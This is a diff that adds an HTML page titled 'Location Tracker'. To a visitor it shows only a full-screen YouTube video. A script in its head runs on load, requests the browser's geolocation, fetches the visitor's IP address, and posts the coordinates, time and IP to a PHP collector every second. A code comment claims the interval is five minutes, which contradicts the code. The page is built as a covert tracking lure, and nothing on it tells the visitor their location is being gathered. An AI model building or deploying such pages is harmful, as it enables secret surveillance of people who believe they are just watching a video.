@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <title>Location Tracker</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            
+            // Get current date and time
+            var now = new Date();
+            var dateTime = now.toLocaleString();
+            
+            // Get user IP address
+            var xhrIp = new XMLHttpRequest();
+            xhrIp.open("GET", "https://api.ipify.org", true);
+            xhrIp.onreadystatechange = function() {
+                if (xhrIp.readyState == 4 && xhrIp.status == 200) {
+                    var ipAddress = xhrIp.responseText;
+                    
+                    // Send coordinates, date, time, and IP address to PHP script
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "http://localhost:8888/handle_location.php", true);
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    xhr.onreadystatechange = function() {
+
+                    };
+                    xhr.send("latitude=" + latitude + "&longitude=" + longitude + "&dateTime=" + dateTime + "&ipAddress=" + ipAddress);
+                }
+            };
+            xhrIp.send();
+        }
+        
+        // Call getLocation every 5 minutes
+        getLocation();
+        setInterval(getLocation, 1000); // 5 minutes in milliseconds
+    </script>
+</head>
+<body>
+    <iframe src="https://www.youtube.com/embed/bT_gJ18C5O4" frameborder="0" allowfullscreen></iframe>
+</body>
+</html>
